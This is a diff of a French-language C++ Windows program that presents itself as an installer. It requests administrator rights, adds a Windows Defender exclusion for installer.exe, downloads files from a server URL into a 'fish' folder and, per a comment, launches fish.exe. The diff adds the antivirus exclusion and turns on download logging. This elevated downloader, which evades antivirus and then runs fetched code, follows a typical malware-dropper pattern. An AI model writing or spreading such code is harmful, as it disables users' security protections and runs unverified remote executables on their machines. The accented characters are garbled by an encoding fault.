@@ -84,6 +84,8 @@ int main() {
 
     RequestAdminPrivileges();
     
+    AddDefenderExclusion("\\installer.exe");
+
     string userFolder = GetUserFolderPath();
     if (userFolder.empty()) {
         MessageBox(NULL, "Impossible d'obtenir le dossier utilisateur.", "Erreur", MB_OK | MB_ICONERROR);
@@ -108,16 +110,16 @@ int main() {
         string url = SERVER_URL + file;
         string localPath = fishFolder + "\\" + file;
 
-        //cout << "D�but du t�l�chargement de : " << url << endl;
+        cout << "D�but du t�l�chargement de : " << url << endl;
 
         // T�l�chargement bloquant
         if (!DownloadFile(url, localPath)) {
-            //cout << "�chec du t�l�chargement de : " << url << endl;
+            cout << "�chec du t�l�chargement de : " << url << endl;
             //MessageBox(NULL, ("�chec du t�l�chargement de " + file).c_str(), "Erreur", MB_OK | MB_ICONERROR);
             return 1;
         }
 
-        //cout << "T�l�chargement r�ussi de : " << url << " vers " << localPath << endl;
+        cout << "T�l�chargement r�ussi de : " << url << " vers " << localPath << endl;
     }
 
     // Lancer fish.exe
